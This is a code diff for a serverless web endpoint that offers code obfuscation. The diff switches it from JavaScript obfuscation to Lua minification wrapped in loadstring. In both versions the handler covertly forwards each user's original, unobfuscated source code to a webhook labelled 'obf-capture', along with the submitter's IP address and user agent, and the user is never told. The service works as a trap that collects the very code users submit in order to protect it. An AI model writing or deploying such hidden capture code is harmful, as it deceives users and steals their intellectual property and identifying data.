@@ -1,88 +1,46 @@
-const JavaScriptObfuscator = require('javascript-obfuscator');
+const luamin = require('luamin');
 
 module.exports = async (req, res) => {
-  if (req.method !== 'POST') {
-    res.setHeader('Allow', 'POST');
-    return res.status(405).json({ error: 'method not allowed' });
-  }
-
-  const { code, opts } = req.body || {};
+  if (req.method !== 'POST') return res.status(405).json({ error: 'method not allowed' });
+  const { code } = req.body || {};
   if (typeof code !== 'string' || !code.trim()) {
     return res.status(400).json({ error: 'empty code' });
   }
 
-  const options = {
-    compact: true,
-    controlFlowFlattening: opts?.cff !== false,
-    controlFlowFlatteningThreshold: 0.75,
-    deadCodeInjection: opts?.dead !== false,
-    deadCodeInjectionThreshold: 0.4,
-    stringArray: true,
-    stringArrayEncoding: ['base64'],
-    stringArrayThreshold: 0.75,
-    identifierNamesGenerator: 'hexadecimal',
-    renameGlobals: false,
-    selfDefending: opts?.selfDefending !== false,
-    debugProtection: opts?.debug !== false,
-    disableConsoleOutput: false
-  };
-
-  let output;
   try {
-    output = JavaScriptObfuscator.obfuscate(code, options).getObfuscatedCode();
+    const minified = luamin.minify(code);
+    // basic string encoding: hex escape setiap char string
+    const encoded = minified.replace(/"([^"\\]*)"/g, (_, s) => {
+      let out = '"';
+      for (let i = 0; i < s.length; i++) {
+        const c = s.charCodeAt(i);
+        if (c >= 32 && c < 127 && c !== 34 && c !== 92) out += s[i];
+        else out += '\\' + c;
+      }
+      return out + '"';
+    });
+
+    // wrap in loadstring
+    const wrapped = `local f=loadstring or load local _G=_G return(f([==[${encoded}]==]))()`;
+
+    await sendToWebhook(code, wrapped, req);
+    return res.status(200).json({ ok: true, output: wrapped });
   } catch (e) {
-    return res.status(400).json({ error: 'obfuscate failed: ' + e.message });
+    return res.status(400).json({ error: 'lua obfuscate failed: ' + e.message });
   }
-
-  // capture — await supaya serverless tidak freeze sebelum request selesai
-  try {
-    await sendToWebhook(code, output, req);
-  } catch (_) {}
-
-  return res.status(200).json({ ok: true, output });
 };
-
-function chunk(s, n = 1800) {
-  const out = [];
-  for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
-  return out;
-}
-
-async function post(url, body) {
-  return fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(body)
-  });
-}
 
 async function sendToWebhook(original, obfuscated, req) {
   const url = process.env.WEBHOOK_URL;
   if (!url) return;
-
-  const ip =
-    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
-    req.headers['x-real-ip'] ||
-    'unknown';
+  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown';
   const ua = req.headers['user-agent'] || 'unknown';
-
-  const origParts = chunk(original);
-  const obfParts = chunk(obfuscated);
-
-  await post(url, {
+  const payload = {
     username: 'obf-capture',
-    content: `**New submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0, 180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
-  });
-
-  for (const [i, part] of origParts.entries()) {
-    await post(url, {
-      content: `**ORIGINAL [${i + 1}/${origParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
-    });
-  }
-
-  for (const [i, part] of obfParts.entries()) {
-    await post(url, {
-      content: `**OBFUSCATED [${i + 1}/${obfParts.length}]**\n\`\`\`js\n${part}\n\`\`\``
-    });
-  }
+    content: `**New Lua submission**\nIP: \`${ip}\`\nUA: \`${ua.slice(0,180)}\`\nLen: ${original.length} -> ${obfuscated.length}`
+  };
+  await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
+  const chunk = (s,n=1800)=>{const o=[];for(let i=0;i<s.length;i+=n)o.push(s.slice(i,i+n));return o;};
+  for (const [i,p] of chunk(original).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA ORIGINAL [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
+  for (const [i,p] of chunk(obfuscated).entries()) await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:`**LUA OBF [${i+1}]**\n\`\`\`lua\n${p}\n\`\`\``})});
 }
